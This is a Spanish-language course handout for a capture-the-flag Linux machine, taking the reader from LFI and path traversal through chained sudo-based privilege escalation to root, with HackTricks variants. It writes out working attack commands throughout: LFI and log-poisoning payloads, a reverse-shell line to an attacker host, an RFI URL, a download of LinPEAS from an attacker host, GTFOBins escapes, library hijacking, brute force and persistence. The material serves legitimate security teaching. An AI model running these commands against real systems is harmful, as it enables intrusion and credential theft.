---
tags:
- Máquinas y prácticas
---

# Rockstar Escalada Linux LFI

**EVOLVE ACADEMY · MÁSTER EN CIBERSEGURIDAD**

**Máquina Rockstar — Movimiento lateral y escalada en Linux**

The Hacking Labs · Permisos Linux · sudo -l · hijacking · LFI / RFI / Path Traversal

Instructor: Carlos Gómez Pintado · 07/07/2026

| **ℹ Contexto del laboratorio**  **Máquina: Rockstar**, de la plataforma **The Hacking Labs**. CTF Linux con varios usuarios encadenados (estilo "mini-directorio activo"): shark → wwwveret → lusail → username3 → root. Todo el trabajo es sobre un laboratorio autorizado. |
| --- |
| **ℹ Ampliación con HackTricks**  Este apunte incluye, además del recorrido de clase, secciones **"Variantes según HackTricks"** con formas alternativas de explotar los mismos servicios/técnicas usando comandos de Kali. Las variantes se han contrastado con HackTricks y GTFOBins; están pensadas para estudio en laboratorios autorizados, no para uso contra sistemas sin permiso. |

# **Objetivos de la sesión**

- Repasar la explotación web del día anterior: reconocimiento, fuzzing de directorios y de parámetros, y **LFI / Path Traversal**.
- Entender por qué **no tiene sentido fuzzear parámetros en HTML** y sí en PHP, .NET, Java o JavaScript.
- Comprender el **modelo de permisos de Linux** (owner/group/other, rwx y octal).
- Practicar **movimiento lateral encadenado** entre varios usuarios hasta root.
- Aprender cuatro técnicas de **escalada de privilegios** basadas en sudo -l.
- Introducir la teoría de **Path Traversal, LFI, RFI y XXE** para el bloque de explotación web.
- **(Ampliación)** Conocer variantes alternativas de cada técnica según HackTricks / GTFOBins.

# **Conceptos clave**

## **Fuzzing de parámetros: dónde sí y dónde no**

En una URL los datos se envían mediante **parámetros** (?clave=valor), concatenables con &. Fuzzear parámetros solo tiene sentido en ficheros cuyo código se ejecuta en el **back-end**.

| **ℹ Regla del fuzzing de parámetros**  **HTML no se fuzzea**: es *front-end*, no valida contra el servidor, así que los parámetros nunca llegan al back. Sí tiene sentido en **PHP, .NET, JavaScript o Java**. En la práctica casi siempre .php o .net. |
| --- |

## **Interacción forzada y LFI**

Un **Internal Server Error** al pasar un fichero como valor de un parámetro indica comunicación con el back-end. Cuando el PHP concatena un parámetro controlado con una variable que abre/incluye un fichero, aparece un **Local File Inclusion (LFI)**.

## **Shell estabilizada vs. no estabilizada**

Una shell por **SSH** viene *estabilizada* (cualquier comando, editores, TTY completo): lo mejor posible. Una *reverse shell* típica llega **no estabilizada**. Por eso, tras el acceso, interesa migrar a una shell mejor.

## **El modelo de permisos de Linux**

En ls -la, el **primer carácter** indica el tipo (- fichero, d directorio, l enlace, s SUID/SGID). Los **nueve siguientes** son tres tríos:

- **Owner** (propietario).
- **Group** (grupo; por defecto owner = group).
- **Other** (los demás).

Orden siempre r w x. En binario: **r = 4, w = 2, x = 1**; se suman por trío. Máximo por trío = **7**.

| **⚠ Buenas prácticas de permisos**  **`777` es una aberración**: todos los permisos a todos. Óptimo suele ser **`755`**. En sistemas viejos con varios administradores es común encontrar permisos mal puestos por comodidad. |
| --- |

# **Desarrollo técnico — recorrido de Rockstar**

## **3.1 Descubrimiento y acceso inicial (repaso)**

Flujo estándar: descubrir hosts, escanear puertos/servicios y atacar el web del puerto 80.

| sudo netdiscover -r 10.0.2.0/24  nmap -sV -sC 10.0.2.9 |
| --- |

Aparecen **22 (SSH)** y **80 (HTTP)**. Se empieza por el 80. La web no muestra nada útil → enumeración con **dirsearch** añadiendo extensiones.

| dirsearch -u http://10.0.2.9/  dirsearch -u http://10.0.2.9/ -x php,html |
| --- |
| **ℹ Fidelidad de datos**  Los valores 10.0.2.0/24, host 10.0.2.9, puertos 22/80 y ficheros se toman **tal cual de la transcripción**. No se inventa ningún dato. |

## **Variantes de enumeración según HackTricks**

Alternativas al dúo netdiscover + dirsearch, todas disponibles en Kali:

| sudo arp-scan -l  nmap -sn 10.0.2.0/24  nmap -p- --min-rate 5000 -sV -sC 10.0.2.9  gobuster dir -u http://10.0.2.9/ -w /usr/share/wordlists/dirb/common.txt -x php,html  feroxbuster -u http://10.0.2.9/ -x php,html  ffuf -u http://10.0.2.9/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html  whatweb http://10.0.2.9/  nikto -h http://10.0.2.9/ |
| --- |
| **ℹ Ampliación — misma fase, otras herramientas**  Todas persiguen lo mismo que en clase: descubrir hosts y rutas/ficheros web. **gobuster, feroxbuster y ffuf** son intercambiables con dirsearch; **arp-scan** es alternativa a netdiscover; **whatweb/nikto** añaden fingerprinting del stack web. |

## **3.2 LFI y Path Traversal sobre index.php (repaso)**

Con curl sobre index.php salía *Internal Server Error* (el back respondía). Se buscó un **parámetro oculto** con un fuzzer propio (hecho con IA como alternativa a **x8**), por POST y sustituyendo la posición del dato con un diccionario.

| curl -i http://10.0.2.9/index.php  curl -i -X POST --data 'FUZZ' http://10.0.2.9/index.php |
| --- |
| **⚠ LFI + Path Traversal confirmados**  Diccionario: common.txt de /usr/share/wordlists/dirb/. El parámetro permitía indicar un fichero (p. ej. db.php) que la app leía/ejecutaba → **LFI**. Con ../../ se confirmó **Path Traversal** y lectura arbitraria (p. ej. /etc/passwd). |

Con /etc/passwd se enumeran usuarios. Los nologin no autentican; interesan los que tienen /bin/bash. Varios usuarios con login → la máquina exige **movimiento lateral** antes de root.

## **Variantes de LFI / Path Traversal según HackTricks**

Formas alternativas de descubrir y explotar el mismo LFI. **Descubrir el parámetro** con fuzzers de Kali en vez del fuzzer propio:

| ffuf -u 'http://10.0.2.9/index.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0  wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 0 'http://10.0.2.9/index.php?file=FUZZ'  x8 -u http://10.0.2.9/index.php -w /usr/share/wordlists/dirb/common.txt |
| --- |

**Parámetros candidatos habituales a LFI** (top HackTricks): file, page, path, include, document, folder, doc, view, cat, dir. **Payloads de traversal** y bypass típicos:

| http://10.0.2.9/index.php?file=../../../../../../etc/passwd  http://10.0.2.9/index.php?file=....//....//....//etc/passwd  http://10.0.2.9/index.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd  http://10.0.2.9/index.php?file=/etc/passwd%00 |
| --- |
| **ℹ Wrappers PHP (HackTricks)**  **Wrappers PHP** (leer código fuente o escalar a RCE) cuando la inclusión pasa por include/require. php://filter no ejecuta, solo revela la fuente en base64; data:///php://input requieren allow\_url\_include=On. |
| http://10.0.2.9/index.php?file=php://filter/convert.base64-encode/resource=index.php  http://10.0.2.9/index.php?file=php://filter/read=string.rot13/resource=index.php  http://10.0.2.9/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id |
| **⚠ Escalar el LFI a ejecución**  **LFI → RCE por log poisoning** (idea HackTricks): inyectar <?php system($\_GET['c']); ?> en un campo reflejado en un log (User-Agent → access.log) y luego incluir el log vía LFI. Herramientas automáticas: **fimap**, **LFISuite**, **LFImap**. En Rockstar no hizo falta: con las credenciales de db.php ya se entró por SSH. |
| curl -A '<?php system($\_GET["c"]); ?>' http://10.0.2.9/  http://10.0.2.9/index.php?file=/var/log/apache2/access.log&c=id |

## **3.3 Acceso por SSH y persistencia con clave RSA**

Con las credenciales de **shark** (de db.php) se accede por SSH. Como persistencia y para una shell mejor, se genera un par RSA y se deja la pública en authorized\_keys, reentrando con la privada.

| ssh shark@10.0.2.9  ssh-keygen  ssh -i id\_rsa shark@10.0.2.9 |
| --- |
| **ℹ Ampliación — persistencia por clave**  .ssh es carpeta oculta (empieza por punto). Guardar ahí una clave pública propia = persistencia robusta sin depender de una shell inestable. |

## **3.4 Enumeración tras cada acceso: uname -a y sudo -l**

Tras cada usuario: además de whoami y pwd, un uname -a para la versión del **kernel** (muchos 0-days de escalada dependen de ella).

| whoami  pwd  uname -a  sudo -l |
| --- |
| **⚠ Cuándo NO sirve el exploit de kernel**  En Rockstar el kernel estaba **parcheado** (2025) frente a exploits de 2026 → vía kernel descartada. Se pasa a sudo -l, que lista qué se puede ejecutar **suplantando a otro** usuario. |
| **ℹ Ampliación — enumeración automática**  **Automatizar la enumeración local (HackTricks):** en vez de ir a mano, subir y correr **LinPEAS** (o pspy para procesos, linux-exploit-suggester para kernel). Detecta sudo, SUID, PATH escribible, cron, capabilities, etc. |
| python3 -m http.server 8000 # en la máquina atacante, sirviendo linpeas.sh  wget http://ATACANTE:8000/linpeas.sh -O /tmp/linpeas.sh  chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh  find / -perm -4000 2>/dev/null # buscar binarios SUID |

# **Cuatro técnicas de escalada / movimiento lateral**

Regla de oro: **escritura + ejecución sobre un fichero que puedes ejecutar como otro usuario (vía `sudo -l`) = escalada.**

## **Técnica 1 — Binario ejecutable escribible (shark → wwwveret)**

sudo -l: **shark** puede ejecutar bob como **wwwveret**. bob es un ELF de 32 bits compilado (no legible con cat), pero shark **tiene escritura** sobre él. En vez de un *buffer overflow* (que el binario simula sin explotar), se sobrescribe por bash y se ejecuta suplantando.

| ls -la bob  file bob  sha1sum bob  echo 'bash' > bob  cat bob  sudo -u wwwveret /home/shark/bob |
| --- |
| **⚠ Impersonación vía binario escribible**  Al ejecutar bash suplantando a wwwveret, la shell es de wwwveret. Mismo concepto que un cron que ejecuta un .py como root: si modificas el .py, la shell es de root. |
| **ℹ Ampliación — GTFOBins / reverse shell**  **Variantes según HackTricks (binario escribible o sudo sobre binario):** en vez de bash, un one-liner reverse shell; o, si el sudo -l apunta a un binario de GTFOBins (find, python, awk, vim, less, nmap…), usar su *escape* directo. La lógica no cambia: ejecutar código como el otro usuario. |
| echo 'bash -i >& /dev/tcp/ATACANTE/4444 0>&1' > bob  sudo -u wwwveret find . -exec /bin/sh \; -quit  sudo -u wwwveret awk 'BEGIN {system("/bin/sh")}'  sudo -u wwwveret python3 -c 'import os; os.system("/bin/bash")' |

## **Técnica 2 — Cracking de ZIP con John (wwwveret → lusail)**

Como wwwveret aparece Rubiales.zip (legible por *other*). Al descomprimir pide contraseña. Se extrae el hash con zip2john y se rompe con **John** + rockyou.txt.

Si no hay herramienta ni Internet (red interna), se levanta un servidor Python en el objetivo y se baja el fichero con wget a la máquina atacante. **Nunca** se corren herramientas de hacking en la víctima.

| unzip Rubiales.zip  python3 -m http.server 8000  wget http://10.0.2.9:8000/Rubiales.zip  zip2john Rubiales.zip > hash  cat hash  john --wordlist=/usr/share/wordlists/rockyou.txt hash  unzip Rubiales.zip |
| --- |
| **✓ Resultado del cracking**  Contraseña recuperada: **princess** (del ZIP, no de un usuario). Dentro había password.txt con un **listado de contraseñas**. |
| **ℹ Ampliación — identificar el tipo de hash**  El **prefijo del hash** identifica el tipo ($2$ Blowfish, prefijos NTLMv2, etc.). John/Hashcat no revierten el algoritmo: hashean cada palabra del diccionario y comparan; misma palabra + mismo algoritmo = mismo hash siempre. |

## **Variantes de cracking de ZIP según HackTricks**

Mismo objetivo (romper el ZIP), otras herramientas de Kali:

| fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Rubiales.zip  zip2john Rubiales.zip | cut -d ':' -f 2 > hashzip.txt  hashcat -a 0 -m 13600 hashzip.txt /usr/share/wordlists/rockyou.txt  john --show hash |
| --- |
| **ℹ Ampliación — fcrackzip / hashcat**  **fcrackzip** ataca el ZIP directamente (sin extraer hash). **Hashcat** usa el modo -m 13600 (WinZip). john --show recupera después la contraseña ya crackeada del *pot*. Para otros formatos: ssh2john, keepass2john, pdfcrack. |

## **Técnica 2b — Fuerza bruta controlada con Hydra**

Con users.txt (4 usuarios) y password.txt (13 contraseñas): fuerza bruta acotada por SSH con Hydra → 4 × 13 = 52 combinaciones (controlado, a diferencia de lanzar rockyou entero).

| hydra -L users.txt -P password.txt ssh://10.0.2.9 |
| --- |
| **✓ Credencial válida obtenida**  Hydra: **lusail** tiene contraseña válida. -L lista de usuarios, -P lista de contraseñas, y si el puerto no es 22 hay que indicarlo (como en *RickdiculouslyEasy*). |

## **Variantes de fuerza bruta SSH según HackTricks**

| hydra -L users.txt -P password.txt 10.0.2.9 ssh -V -t 4  medusa -h 10.0.2.9 -U users.txt -P password.txt -M ssh  ncrack -p 22 -U users.txt -P password.txt 10.0.2.9  netexec ssh 10.0.2.9 -u users.txt -p password.txt |
| --- |
| **ℹ Ampliación — medusa / ncrack / netexec**  **medusa**, **ncrack** y **netexec (nxc)** hacen lo mismo que Hydra sobre SSH. netexec además valida credenciales masivas y sobre otros protocolos (smb, winrm, mssql...). Recuerda: fuerza bruta solo en laboratorios autorizados y con listas acotadas para no bloquear cuentas. |

## **Técnica 3 — Library/PATH hijacking en Python (lusail → username3)**

Como **lusail**, sudo -l: puede ejecutar Rubiales.py como **username3**. Puede **leer** el script pero **no escribirlo**. El script importa psutil y llama a virtual\_memory.

Clave: el **PATH**. Python busca el import recorriendo el PATH de izquierda a derecha (primero el directorio local). Si se coloca un psutil.py malicioso en una ruta buscada **antes** que la librería real, se ejecuta el código del atacante. Esto es **hijacking**.

| cat Rubiales.py  cat psutil.py  echo 'import os' > psutil.py  echo 'os.system("bash")' >> psutil.py  sudo -u username3 /usr/bin/python3 /home/lusail/Rubiales.py |
| --- |
| **⚠ Library hijacking vía PATH**  Rubiales.py (como username3) importa el psutil.py del atacante y lanza bash. Como invoca username3, la shell es de **username3**. Triángulo: username3 → Rubiales.py → psutil.py → bash. |
| **ℹ Ampliación — segunda vía al mismo resultado**  **Variante name hijacking (Manu):** renombrar el original (mv Rubiales.py a.py) y crear otro Rubiales.py propio con import os; os.system('bash'). Funciona por cómo sudo -l resuelve por **nombre/ruta**, no por puntero al fichero. |
| **ℹ Ampliación — LD\_PRELOAD / PATH hijacking**  **Variantes según HackTricks (env de sudo):** si sudo -l muestra env\_keep+=LD\_PRELOAD o LD\_LIBRARY\_PATH, se compila un .so malicioso y se precarga; si un script llamado con sudo usa un **binario con ruta relativa**, se hace **PATH hijacking** clásico creando ese binario en una carpeta escribible del PATH. |
| gcc -shared -fPIC -o /tmp/x.so - # (código \_init que lanza /bin/bash -p)  sudo LD\_PRELOAD=/tmp/x.so /ruta/al/binario  export PATH=/tmp:$PATH # con /tmp escribible y un binario falso dentro |
| **✓ Cómo se defiende esto**  **Mitigaciones:** ruta absoluta en el import / al invocar el intérprete, verificar el **hash** de la librería, o restringir escritura (DLP). Los ficheros de /usr/bin, /lib, /etc pertenecen a root. |

## **Técnica 4 — Shell como root vía sudo (username3 → root)**

Como **username3**, sudo -l permite /usr/bin/bsh como **root**. bsh es una shell no estándar: sus comandos no son los de bash. Ante una shell desconocida, se consulta cómo ejecutar comandos (IA/documentación).

En bsh los comandos van con exec("..."). Lanzada como root, exec("id") confirma UID 0.

| sudo /usr/bin/bsh  exec("id"); |
| --- |
| **✓ Root conseguido**  No todas las shells son iguales (bash, /bin/sh, /bin/dash, bsh…): distinta sintaxis. Con exec("id"); → **root**. |
| **ℹ Ampliación — SUID, sudo -l y GTFOBins**  **SUID vs. `sudo -l`:** un binario **SUID** lo ejecuta cualquiera y corre como su propietario, sin sudo. sudo -l habilita a un usuario concreto a impersonar a otro; si hay una shell, se invoca con ruta y sudo. **Variante HackTricks:** ante sudo -l con un binario, filtrar en **GTFOBins** por contexto *Sudo* y aplicar el escape catalogado. |

# **Kill chain de Rockstar**

| **1. Enumeración: netdiscover + nmap (22/SSH, 80/HTTP)** |
| --- |

**↓**

| **2. Web: dirsearch + fuzzing de parámetro → LFI / Path Traversal en index.php** |
| --- |

**↓**

| **3. Acceso inicial: credenciales de db.php → SSH como shark** |
| --- |

**↓**

| **4. Lateral 1: binario 'bob' escribible + sudo -l → wwwveret** |
| --- |

**↓**

| **5. Lateral 2: Rubiales.zip → zip2john + John (rockyou) / Hydra → lusail** |
| --- |

**↓**

| **6. Lateral 3: hijacking de psutil.py vía PATH en Rubiales.py → username3** |
| --- |

**↓**

| **7. Escalada final: sudo /usr/bin/bsh + exec("id") → ROOT** |
| --- |

# **Herramientas utilizadas en la sesión**

| **Herramienta** | **Objetivo** | **Fase** | **Uso visto** | **Nivel** | **Notas** |
| --- | --- | --- | --- | --- | --- |
| netdiscover | Descubrir hosts | Reconocimiento | sudo netdiscover -r 10.0.2.0/24 | Practicada | Alt.: arp-scan, nmap -sn |
| Nmap | Puertos y servicios | Enumeración | nmap -sV -sC 10.0.2.9 | Recurrente | Detectó 22 y 80 |
| dirsearch | Rutas y ficheros web | Enumeración web | dirsearch -u URL -x php,html | Practicada | Alt.: gobuster, feroxbuster, ffuf |
| curl | Peticiones HTTP | Explotación web | curl -i -X POST --data ... URL | Practicada | Detecta ISE / LFI |
| x8 / fuzzer propio | Descubrir parámetros | Explotación web | diccionario common.txt | Introducida | Alt.: ffuf, wfuzz |
| ssh / ssh-keygen | Acceso y persistencia | Acceso / Post-expl. | ssh -i id\_rsa user@IP | Practicada | Clave RSA en .ssh |
| python3 http.server | Transferir ficheros | Post-explotación | python3 -m http.server 8000 | Recurrente | Con wget |
| zip2john | ZIP → hash | Cracking | zip2john Rubiales.zip > hash | Introducida | Alt.: fcrackzip |
| John the Ripper | Romper hashes | Cracking | john --wordlist=rockyou.txt hash | Practicada | Recuperó 'princess' |
| Hydra | Fuerza bruta login | Acceso | hydra -L users -P pass ssh://IP | Practicada | Alt.: medusa, ncrack, nxc |
| sudo -l | Listar permisos sudo | Escalada | sudo -l | Recurrente | El nmap de la escalada |
| bsh | Shell como root | Escalada | sudo /usr/bin/bsh ; exec(id); | Introducida | Sintaxis exec(...) |

# **Comandos importantes (resumen)**

| sudo netdiscover -r 10.0.2.0/24  nmap -sV -sC 10.0.2.9  dirsearch -u http://10.0.2.9/ -x php,html  curl -i -X POST --data 'FUZZ' http://10.0.2.9/index.php  ssh -i id\_rsa shark@10.0.2.9  uname -a  sudo -l  file bob  echo 'bash' > bob  sudo -u wwwveret /home/shark/bob  python3 -m http.server 8000  wget http://10.0.2.9:8000/Rubiales.zip  zip2john Rubiales.zip > hash  john --wordlist=/usr/share/wordlists/rockyou.txt hash  hydra -L users.txt -P password.txt ssh://10.0.2.9  echo 'import os' > psutil.py  echo 'os.system("bash")' >> psutil.py  sudo -u username3 /usr/bin/python3 /home/lusail/Rubiales.py  sudo /usr/bin/bsh  exec("id"); |
| --- |

## **Comandos alternativos (según HackTricks) — chuleta**

| gobuster dir -u http://10.0.2.9/ -w /usr/share/wordlists/dirb/common.txt -x php,html  ffuf -u 'http://10.0.2.9/index.php?FUZZ=/etc/passwd' -w burp-parameter-names.txt -fs 0  curl 'http://10.0.2.9/index.php?file=php://filter/convert.base64-encode/resource=index.php'  fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Rubiales.zip  hashcat -a 0 -m 13600 hashzip.txt /usr/share/wordlists/rockyou.txt  medusa -h 10.0.2.9 -U users.txt -P password.txt -M ssh  netexec ssh 10.0.2.9 -u users.txt -p password.txt  find / -perm -4000 2>/dev/null  sudo -u wwwveret find . -exec /bin/sh \; -quit |
| --- |

# **Teoría: Path Traversal, LFI, RFI y XXE**

Bloque teórico que prepara el módulo web. Path Traversal habilita a menudo LFI y RFI.

## **Path Traversal (Directory Traversal)**

Permite **moverse entre directorios** con ../. Si una variable que abre ficheros no está saneada, se sale de la ruta prevista hacia /etc/passwd, etc.

| http://IP/index.php?file=../../../../../etc/passwd |
| --- |
| **ℹ Cuántos ../ poner**  Se pueden poner **tantos `../` como se quiera**: al llegar a / no se retrocede más. Práctica: **9** combinaciones para asegurar la raíz. Desde / es más fácil enumerar (estructura de carpetas Linux constante). |

## **LFI — Local File Inclusion**

Incluir/leer un **fichero local** al que no se debería acceder por esa función web. Suele nacer de un Path Traversal sobre file.open(variable). Con wrappers PHP puede escalar a lectura de fuente o RCE (ver variantes).

## **RFI — Remote File Inclusion**

La más peligrosa: la variable hace una **llamada a URL** (p. ej. un CDN). Si no está saneada, se inyecta la URL de un servidor del atacante con una reverse shell y el objetivo la **descarga y ejecuta**. En PHP requiere allow\_url\_include=On (por defecto Off).

| http://IP/index.php?file=http://ATACANTE/shell.txt |
| --- |

## **XXE (adelanto)**

| **⚠ Pendiente para la próxima sesión**  **XXE** encadena en una misma explotación **LFI** y **Path Traversal**. Se verá la próxima sesión con una máquina de "banco". Se anuncia pero **no se desarrolla** hoy. |
| --- |
| **ℹ Ampliación — LFI no es RCE**  LFI vs. RCE: si ya tienes ejecución remota de comandos (RCE), no necesitas el LFI para leer ficheros; el LFI es útil cuando **solo** puedes leer/incluir. |

# **Riesgos, errores comunes y buenas prácticas**

| **⚠ AVISO**  **No ejecutes lo que no entiendes.** bob simulaba un *buffer overflow* que no hace nada. Analiza (file, sha1sum, cat) y, si tienes escritura, sustituye su contenido por algo controlado. |
| --- |
| **⚠ RIESGO**  **Nunca corras herramientas de hacking en la víctima**: baja el fichero a tu máquina con Python + wget. Los servidores dejan **logs con la IP** de quien pide: en lab está bien, en real es una traza tuya. |
| **✓ CORRECTO**  **Buenas prácticas:** usuario de bajos privilegios y pedir la contraseña de administrador solo cuando haga falta, en vez de chmod 777 o subir privilegios por comodidad. Muchas escaladas nacen de errores heredados. |
| **ℹ NOTA**  nologin en /etc/passwd = cuenta que no inicia sesión; las cuentas de servicio (p. ej. www-data) casi nunca aportan. Una cuenta de usuario, aun con pocos privilegios, suele valer más. |
| **⚠ Alcance autorizado**  **Nota legal:** las variantes de HackTricks/GTFOBins de este apunte son para **laboratorios autorizados** (Rockstar / The Hacking Labs, HTB, entornos propios). No se aplican contra sistemas sin permiso explícito. |

# **Conexión con sesiones anteriores**

Rockstar **encadena** casi todo lo visto en el máster en una sola máquina:

- **Enumeración** (Nmap, netdiscover, dirsearch) — fase inicial recurrente; hoy se añaden **gobuster/feroxbuster/ffuf** como equivalentes.
- **Fuzzing de parámetros y LFI/Path Traversal** — continuación directa de la clase anterior (fuzzer propio, index.php).
- **Cracking** (John) y **fuerza bruta** (Hydra) — ya introducidas, ahora **practicadas** en CTF; variantes: fcrackzip/hashcat y medusa/ncrack/netexec.
- **`python3 -m http.server` + `wget`** — patrón recurrente de transferencia.
- **Escalada por cron/tarea programada** — misma lógica que la impersonación por binario y el hijacking de librería de hoy.
- **RickdiculouslyEasy** — recordatorio de que Hydra necesita el puerto explícito si no es el 22.

# **Resumen final**

En la máquina **Rockstar** (The Hacking Labs) se hicieron **cuatro saltos de usuario** (shark → wwwveret → lusail → username3 → root), cada uno con una técnica de escalada apoyada en sudo -l: binario escribible ejecutado como otro usuario, cracking de un ZIP con John / fuerza bruta con Hydra, **hijacking** de librería vía PATH en un script Python, y shell personalizada como root con exec("id"). Se consolidó el **modelo de permisos de Linux** y la regla "escritura + ejecución como otro usuario = escalada". La teoría preparó el bloque web con **Path Traversal, LFI, RFI y XXE**. Como ampliación, se añadieron **variantes de HackTricks/GTFOBins** para cada servicio/técnica (gobuster/ffuf, wrappers PHP, fcrackzip/hashcat, medusa/ncrack/netexec, LinPEAS, LD\_PRELOAD/PATH hijacking). Próxima sesión: máquina de "banco" (LFI) y **XXE**; después, **Burp Suite** y vulnerabilidades web.

# **Checklist de repaso**

1. Distingo en qué extensiones fuzzear parámetros (PHP/.NET/JS/Java sí, HTML no).
2. Entiendo LFI y cómo un Path Traversal (../) lo habilita, y sé leer código con php://filter.
3. Sé leer permisos ls -la y convertir a octal (r=4, w=2, x=1).
4. Recuerdo: escritura + ejecución como otro usuario (sudo -l) = escalada.
5. Sé ejecutar como otro usuario con sudo -u usuario ... y aplicar escapes de GTFOBins.
6. Puedo crackear un ZIP con zip2john+John, y también con fcrackzip o hashcat -m 13600.
7. Sé fuerza bruta SSH con Hydra y sus alternativas (medusa, ncrack, netexec).
8. Entiendo library/PATH hijacking y LD\_PRELOAD, y cómo mitigarlos.
9. Sé automatizar enumeración local con LinPEAS y buscar SUID con find -perm -4000.
10. Distingo Path Traversal, LFI, RFI y (a alto nivel) XXE.

# **Actualización del registro de herramientas**

Cambios de nivel y nuevas entradas (copiable a la base de conocimiento del proyecto):

| **Herramienta** | **Nivel** |
| --- | --- |
| John the Ripper / Hashcat | Practicada (John en CTF con zip2john + rockyou; hashcat -m 13600 como alternativa) |
| Hydra | Practicada (subida desde Introducida; alternativas medusa/ncrack/netexec) |
| Netdiscover | Practicada (subida desde Introducida; alternativa arp-scan) |
| dirsearch | Practicada (alternativas gobuster/feroxbuster/ffuf) |
| zip2john | Introducida (NUEVA) |
| fcrackzip | Mencionada (NUEVA — alternativa de cracking de ZIP) |
| bsh (shell personalizada) | Introducida (NUEVA — sintaxis exec(...)) |
| ssh-keygen (persistencia RSA) | Practicada (NUEVA en contexto de persistencia) |
| LinPEAS / linux-exploit-suggester / pspy | Mencionada (enumeración local automatizada — HackTricks) |
| GTFOBins (find/awk/python/vim...) | Mencionada (escapes de sudo/SUID) |
| medusa / ncrack / netexec | Mencionada (alternativas de fuerza bruta a Hydra) |
| wfuzz | Mencionada (fuzzing de LFI/parámetros) |
| x8 | Mencionada (fuzzer de parámetros propio con IA como alternativa) |
| **ℹ Bloque para memoria acumulativa**  Técnicas nuevas: **movimiento lateral encadenado**; **escalada por binario escribible** (sudo -l); **library/PATH hijacking** y **name hijacking**; **LD\_PRELOAD/LD\_LIBRARY\_PATH**; **LFI con wrappers PHP y log poisoning**; **RFI**; **XXE** (pendiente). Plataforma nueva: **The Hacking Labs** (máquina Rockstar). |

# **Actualización de memoria del proyecto**

| **Categoría** | **Información nueva** | **Certeza** | **Acción futura** |
| --- | --- | --- | --- |
| Sesión | Rockstar: movimiento lateral y escalada Linux + teoría LFI/RFI + variantes HackTricks | Alta | — |
| Instructor | Carlos Gómez Pintado | Alta | — |
| Fecha | 07/07/2026 | Alta | — |
| Máquina/plataforma | Rockstar — The Hacking Labs | Alta | Añadir al registro de máquinas |
| Usuarios de la cadena | shark → wwwveret → lusail → username3 → root | Alta | — |
| Técnicas | binario escribible, PATH/library hijacking, name hijacking, LFI/RFI/Path Traversal, XXE (adelanto) | Alta | XXE la próxima sesión |
| Herramientas nuevas | zip2john, fcrackzip, bsh, LinPEAS, medusa/ncrack/netexec | Alta | Añadir al registro |
| Cracking | zip2john + John + rockyou → 'princess' (pass del ZIP) | Alta | — |
| Ampliación HackTricks | wrappers PHP, log poisoning, GTFOBins, LD\_PRELOAD, fuzzers alternativos | Alta | Repasar para el bloque web |
| Temas pendientes | XXE, máquina 'banco' (LFI), luego Burp Suite / web | Alta | Próximas sesiones |
